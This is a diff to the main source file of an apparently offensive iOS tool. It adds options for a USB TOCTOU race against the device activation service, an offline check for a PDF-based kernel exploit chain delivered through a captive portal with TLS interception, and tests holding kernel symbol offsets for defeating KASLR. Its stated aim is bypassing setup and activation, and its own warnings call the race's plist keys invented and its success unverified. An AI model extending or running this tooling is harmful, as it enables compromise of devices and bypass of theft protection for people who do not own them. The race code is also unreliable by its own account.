@@ -8,6 +8,7 @@
 #include "exploits/pmap_device_payload.h"
 #include "exploits/kernel_exploit.h"
 #include "exploits/bypass_chain.h"
+#include "exploits/preboard_race.h"
 #include "exploits/amfi_bypass.h"
 #include "exploits/coretrust_bypass.h"
 #include "exploits/kernel_offsets.h"
@@ -82,6 +83,9 @@ static void print_help(const char *prog_name)
     printf("                             (auto stages 5–8 after OOB path; no fake kRW/activation)\n");
     printf("      --glyphgrift-vector <m>  PDF delivery: img (default) or embed (iframe/object)\n");
     printf("      --glyphgrift-stack       Research-only stack PDF (DX=31); V2 exploit path is heap\n");
+    printf("      --glyphgrift-verify      Offline verify: anchor table, sentinel read-back, heartbeat, PDFs\n");
+    printf("      --preboard-race <us>     [RESEARCH/UNPROVEN] VUL 23 TOCTOU race: delay us (invented plist keys, unverified)\n");
+    printf("      --preboard-race-auto     [RESEARCH/UNPROVEN] VUL 23 auto-tune race: 20/30/40/50/10ms (unverified)\n");
     printf("      --captive-server [port]  Start local DNS/HTTP/TLS captive portal server (default 8080)\n");
     printf("      --captive-dns-port <p>   Specify DNS responder port (default 5353, use 53 with root)\n");
     printf("      --captive-tls-port <p>   Specify TLS MITM inspector port (default 8443, use 443 with root)\n");
@@ -865,9 +869,9 @@ static int run_unit_tests(void)
             "\"error_message\":\"\"}";
         captive_glyphgrift_result_t parsed;
         bool parse_ok = (captive_http_parse_glyphgrift_result(sample, strlen(sample), &parsed) == 0 &&
-                         parsed.valid && parsed.img_error && parsed.crash_suspected &&
-                         parsed.render_time_ms > 12.0 && parsed.render_time_ms < 13.0 &&
-                         strcmp(parsed.build, "23G83") == 0);
+                          parsed.valid && parsed.img_error && parsed.crash_suspected &&
+                          parsed.render_time_ms > 12.0 && parsed.render_time_ms < 13.0 &&
+                          strcmp(parsed.build, "23G83") == 0);
 
         bool pdf_ok = false;
         static const char *pdf_candidates[] = {
@@ -994,6 +998,126 @@ static int run_unit_tests(void)
         }
     }
 
+    /* Test 19: GlyphGrift KASLR anchor table consistency (D2 fix).
+       Every JS anchor offset must equal KOFF_<sym> - KOFF_KERNEL_BASE_SLIDE_HINT,
+       and a simulated 2-anchor leak must converge to one kbase whose C-side
+       kslide hits the real slid symbol address. */
+    total++;
+    printf("Test 19: GlyphGrift KASLR Anchor Table & kslide Recovery (D2)... ");
+    {
+        const uint64_t hint = KOFF_KERNEL_BASE_SLIDE_HINT;
+        struct { const char *name; uint64_t koff; uint64_t js_off; } anchors[] = {
+            { "gVirtBase",               KOFF_GVIRT_BASE,              0x00cb4c78ULL },
+            { "gPhysBase",               KOFF_GPHYS_BASE,              0x00ce92e0ULL },
+            { "gPhysSize",               KOFF_GPHYS_SIZE,              0x00ce92e8ULL },
+            { "ptov_table",              KOFF_PTOV_TABLE,              0x00d2c900ULL },
+            { "trust_cache_rt",          KOFF_TRUST_CACHE_RT,          0x00cd6b20ULL },
+            { "load_static_trust_cache", KOFF_LOAD_STATIC_TRUST_CACHE, 0x03be0888ULL },
+            { "allproc",                 KOFF_ALLPROC,                 0x04236880ULL },
+            { "vm_first_phys",           KOFF_VM_FIRST_PHYS,           0x00cb4c50ULL },
+            { "vm_last_phys",            KOFF_VM_LAST_PHYS,            0x00cb4c58ULL },
+            { "pv_head_table",           KOFF_PV_HEAD_TABLE,           0x00c92e18ULL },
+            { "pp_attr_table",           KOFF_PP_ATTR_TABLE,           0x00c92e10ULL }
+        };
+        const size_t N = sizeof(anchors) / sizeof(anchors[0]);
+        bool table_ok = true;
+        for (size_t i = 0; i < N; i++) {
+            if (anchors[i].koff - hint != anchors[i].js_off) { table_ok = false; break; }
+        }
+        /* Simulate a real KASLR slide; a leak of two symbols must converge. */
+        const uint64_t slide = 0x10000000ULL;
+        const uint64_t kbase = hint + slide;
+        uint64_t derived0 = (anchors[0].koff + slide) - anchors[0].js_off;
+        uint64_t derived1 = (anchors[6].koff + slide) - anchors[6].js_off;  /* allproc */
+        bool converge = (derived0 == kbase && derived1 == kbase && derived0 == derived1);
+        /* C-side kslide must resolve the real slid symbol address. */
+        uint64_t ckslide = derived0 - hint;
+        bool kslide_hit = ((anchors[6].koff + ckslide) == (anchors[6].koff + slide));
+
+        if (table_ok && converge && kslide_hit) {
+            printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
+            passed++;
+        } else {
+            printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET
+                   " (table=%d converge=%d kslide_hit=%d)\n", table_ok, converge, kslide_hit);
+        }
+    }
+
+    /* Test 20: GlyphGrift sentinel canary telemetry parse (Phase 4).
+       A flipped 0xA5 sentinel byte is a precise, self-attested OOB read-back. */
+    total++;
+    printf("Test 20: GlyphGrift Sentinel Canary Read-Back Telemetry... ");
+    {
+        static const char sentinel[] =
+            "{\"corruption_detected\":true,\"relative_rw_achieved\":false,"
+            "\"sentinel_hit\":true,\"sentinel_zone\":128,\"sentinel_index\":37,"
+            "\"sentinel_offset\":4,\"sentinel_before\":165,\"sentinel_after\":166,"
+            "\"krw_ready\":false,\"kbase\":0}";
+        captive_glyphgrift_exploit_result_t sp;
+        bool sent_ok = (captive_http_parse_glyphgrift_exploit_result(sentinel, strlen(sentinel), &sp) == 0 &&
+                        sp.corruption_detected && sp.sentinel_hit &&
+                        sp.sentinel_zone == 128 && sp.sentinel_index == 37 &&
+                        sp.sentinel_offset == 4 && sp.sentinel_before == 0xa5 &&
+                        sp.sentinel_after == 0xa6 && !sp.relative_rw_achieved);
+
+        /* Absent sentinel fields must parse to a clean default (no false hit). */
+        static const char nosent[] =
+            "{\"corruption_detected\":false,\"relative_rw_achieved\":false,"
+            "\"krw_ready\":false,\"kbase\":0}";
+        captive_glyphgrift_exploit_result_t ns;
+        memset(&ns, 0, sizeof(ns));
+        bool nosent_ok = (captive_http_parse_glyphgrift_exploit_result(nosent, strlen(nosent), &ns) == 0 &&
+                          !ns.sentinel_hit && ns.sentinel_index == -1);
+
+        if (sent_ok && nosent_ok) {
+            printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
+            passed++;
+        } else {
+            printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET " (sent=%d nosent=%d)\n", sent_ok, nosent_ok);
+        }
+    }
+
+    /* Test 21: GlyphGrift renderer heartbeat lifecycle + leak-confidence gating
+       (Phase 1 + Phase 2). Heartbeat ticks increment and dead-detect; a HIGH-
+       confidence / >=2-anchor leak parses distinct from a LOW single-anchor one. */
+    total++;
+    printf("Test 21: GlyphGrift Renderer Heartbeat & Leak-Confidence Gate... ");
+    {
+        captive_http_reset_glyphgrift_heartbeat();
+        bool reset_zero = (captive_http_glyphgrift_heartbeat_count() == 0);
+        captive_http_glyphgrift_heartbeat();
+        captive_http_glyphgrift_heartbeat();
+        bool tick_count = (captive_http_glyphgrift_heartbeat_count() == 2);
+        bool alive_now = !captive_http_glyphgrift_heartbeat_dead(4000.0);
+        captive_http_reset_glyphgrift_heartbeat();
+
+        static const char high_conf[] =
+            "{\"corruption_detected\":true,\"relative_rw_achieved\":true,"
+            "\"krw_ready\":true,\"kbase\":\"0xfffffff017004000\","
+            "\"leak_confidence\":\"HIGH\",\"leak_anchors\":3}";
+        captive_glyphgrift_exploit_result_t hi;
+        bool high_ok = (captive_http_parse_glyphgrift_exploit_result(high_conf, strlen(high_conf), &hi) == 0 &&
+                        hi.krw_ready && hi.kbase == 0xfffffff017004000ULL &&
+                        strcmp(hi.leak_confidence, "HIGH") == 0 && hi.leak_anchors == 3);
+
+        static const char low_conf[] =
+            "{\"corruption_detected\":true,\"relative_rw_achieved\":true,"
+            "\"krw_ready\":true,\"kbase\":\"0xfffffff017004000\","
+            "\"leak_confidence\":\"LOW\",\"leak_anchors\":1}";
+        captive_glyphgrift_exploit_result_t lo;
+        bool low_ok = (captive_http_parse_glyphgrift_exploit_result(low_conf, strlen(low_conf), &lo) == 0 &&
+                       strcmp(lo.leak_confidence, "LOW") == 0 && lo.leak_anchors == 1);
+
+        if (reset_zero && tick_count && alive_now && high_ok && low_ok) {
+            printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
+            passed++;
+        } else {
+            printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET
+                   " (reset0=%d ticks=%d alive=%d high=%d low=%d)\n",
+                   reset_zero, tick_count, alive_now, high_ok, low_ok);
+        }
+    }
+
     printf("\nSelf-Test Result: %d/%d tests passed cleanly.\n", passed, total);
     printf(ANSI_COLOR_CYAN "========================================================================" ANSI_COLOR_RESET "\n\n");
 
@@ -1110,6 +1234,10 @@ int main(int argc, char **argv)
     int opt_setup_assistant_chain = 0;
     int opt_glyphgrift_chain = 0;
     int opt_glyphgrift_stack = 0;
+    int opt_glyphgrift_verify = 0;
+    int opt_preboard_race = 0;
+    int opt_preboard_race_auto = 0;
+    int preboard_race_delay = 0;
     glyphgrift_vector_t glyphgrift_vector = GLYPHGRIFT_VECTOR_IMG;
     int opt_test = 0;
     int opt_sovereign = 0;
@@ -1197,6 +1325,9 @@ int main(int argc, char **argv)
         OPT_GLYPHGRIFT_CHAIN,
         OPT_GLYPHGRIFT_VECTOR,
         OPT_GLYPHGRIFT_STACK,
+        OPT_GLYPHGRIFT_VERIFY,
+        OPT_PREBOARD_RACE,
+        OPT_PREBOARD_RACE_AUTO,
         OPT_BUILD_APPLEAVE2_PAYLOAD,
         OPT_APPLEAVE2_DEPLOY,
         OPT_APPLEAVE2_STATUS,
@@ -1251,6 +1382,9 @@ int main(int argc, char **argv)
         { "glyphgrift-chain",      no_argument,     NULL, OPT_GLYPHGRIFT_CHAIN },
         { "glyphgrift-vector",     required_argument, NULL, OPT_GLYPHGRIFT_VECTOR },
         { "glyphgrift-stack",      no_argument,     NULL, OPT_GLYPHGRIFT_STACK },
+        { "glyphgrift-verify",     no_argument,     NULL, OPT_GLYPHGRIFT_VERIFY },
+        { "preboard-race",         required_argument, NULL, OPT_PREBOARD_RACE },
+        { "preboard-race-auto",    no_argument,     NULL, OPT_PREBOARD_RACE_AUTO },
         { "build-appleave2-payload", no_argument,   NULL, OPT_BUILD_APPLEAVE2_PAYLOAD },
         { "appleave2-deploy",      no_argument,     NULL, OPT_APPLEAVE2_DEPLOY },
         { "appleave2-status",      no_argument,     NULL, OPT_APPLEAVE2_STATUS },
@@ -1356,6 +1490,14 @@ int main(int argc, char **argv)
                 }
                 break;
             case OPT_GLYPHGRIFT_STACK: opt_glyphgrift_stack = 1; break;
+            case OPT_GLYPHGRIFT_VERIFY: opt_glyphgrift_verify = 1; break;
+            case OPT_PREBOARD_RACE:
+                if (optarg) {
+                    preboard_race_delay = atoi(optarg);
+                    opt_preboard_race = 1;
+                }
+                break;
+            case OPT_PREBOARD_RACE_AUTO: opt_preboard_race_auto = 1; break;
             case OPT_BUILD_APPLEAVE2_PAYLOAD: opt_build_appleave2_payload = 1; break;
             case OPT_APPLEAVE2_DEPLOY: opt_appleave2_deploy = 1; break;
             case OPT_APPLEAVE2_STATUS:
@@ -1382,6 +1524,12 @@ int main(int argc, char **argv)
     }
 
     if (opt_test) {
+        return run_unit_tests();
+    }
+
+    if (opt_glyphgrift_verify) {
+        printf("GlyphGrift offline verify: running the full self-test suite "
+               "(includes Test 19 anchor table / Test 20 sentinel / Test 21 heartbeat).\n\n");
         return run_unit_tests();
     }
 
@@ -1417,6 +1565,50 @@ int main(int argc, char **argv)
         cap_cfg.mode = CAPTIVE_MODE_INTERCEPT;
         return glyphgrift_chain_run(&cap_cfg, glyphgrift_vector,
                                    opt_glyphgrift_stack != 0, NULL);
+    }
+
+    if (opt_preboard_race || opt_preboard_race_auto) {
+        l0fck_session_t sess;
+        memset(&sess, 0, sizeof(sess));
+        session_init(&sess);
+        
+        if (session_connect(&sess) != 0 || !sess.ld) {
+            LOG_ERROR("Failed to connect to device via USB");
+            LOG_INFO("Ensure device is connected and in SetupAssistant mode");
+            session_disconnect(&sess);
+            return 1;
+        }
+        
+        LOG_INFO("Connected to device — executing VUL 23 TOCTOU race exploit");
+        LOG_WARN("========================================================================");
+        LOG_WARN(" VUL 23 race is RESEARCH-ONLY / UNPROVEN (D1).");
+        LOG_WARN(" It sends non-standard plist keys (CreateStashbag/CommitStashbag/");
+        LOG_WARN(" StashbagMode/SkipAuthCheck) that are NOT confirmed to exist in the");
+        LOG_WARN(" target's mobileactivationd. Treat any success as unverified.");
+        LOG_WARN(" The production activation path is the Wi-Fi GlyphGrift chain.");
+        LOG_WARN("========================================================================");
+        
+        int result;
+        if (opt_preboard_race_auto) {
+            LOG_INFO("Auto-tuning race delay (trying 20/30/40/50/10ms)...");
+            result = preboard_race_execute_auto(sess.dev, sess.ld);
+        } else {
+            int delay = (preboard_race_delay > 0) ? preboard_race_delay : 30000;
+            LOG_INFO("Using race delay %d microseconds", delay);
+            result = preboard_race_execute(sess.dev, sess.ld, delay);
+        }
+        
+        if (result == 0) {
+            LOG_SUCCESS("VUL 23 race exploit completed successfully");
+            LOG_INFO("Device should now accept setup bypass preferences");
+            LOG_INFO("Run --dismiss-setup or --stage-bypass to complete activation");
+        } else {
+            LOG_ERROR("VUL 23 race exploit failed");
+            LOG_INFO("Try --preboard-race-auto for automatic delay tuning");
+        }
+        
+        session_disconnect(&sess);
+        return (result == 0) ? 0 : 1;
     }
 
     if (opt_captive) {
@@ -1556,6 +1748,13 @@ int main(int argc, char **argv)
     } else if (opt_activate_offline) {
         ret = albert_perform_offline_activation(sess.dev, sess.ld);
     } else if (opt_activate_race) {
+        LOG_WARN("========================================================================");
+        LOG_WARN(" --activate-race (VUL 23 sweep) is RESEARCH-ONLY / UNPROVEN (D1).");
+        LOG_WARN(" Its inner crash vector fires invented preboardservice_v2 plist keys");
+        LOG_WARN(" (CreateStashbag/CommitStashbag/StashbagMode/SkipAuthCheck) that are");
+        LOG_WARN(" NOT confirmed to exist on the target. Success here is unverified.");
+        LOG_WARN(" Production path: the Wi-Fi GlyphGrift (CVE-2026-86950) chain.");
+        LOG_WARN("========================================================================");
         ret = albert_perform_race_activation(&sess, NULL);
     } else if (opt_deactivate) {
         ret = mobileact_deactivate(sess.dev, sess.ld);
